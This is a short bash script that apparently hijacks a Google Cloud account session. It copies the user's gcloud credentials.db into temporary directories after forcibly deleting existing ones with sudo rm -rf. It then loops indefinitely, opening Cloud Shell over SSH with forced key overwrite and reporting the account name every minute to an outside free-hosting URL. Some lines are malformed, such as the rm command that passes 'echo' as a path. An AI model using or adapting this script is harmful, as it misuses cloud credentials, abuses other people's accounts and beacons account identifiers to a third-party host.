#!/bin/bash

session=$1

user=${session/@*/}

echo "$(pwd)" > home.file

sudo rm -rf echo /tmp/tmp*/credentials.db | xargs -n 1

gcloud info

echo /tmp/tmp*/ | xargs -n 1 cp -v /home/$user/credentials.db

gcloud auth list

while true
do
gcloud cloud-shell ssh --command="date >> log" --authorize-session --force-key-file-overwrite --account=$session --quiet
curl https://g11977765505.000webhostapp.com/ping.php?user=$session
sleep 60
done
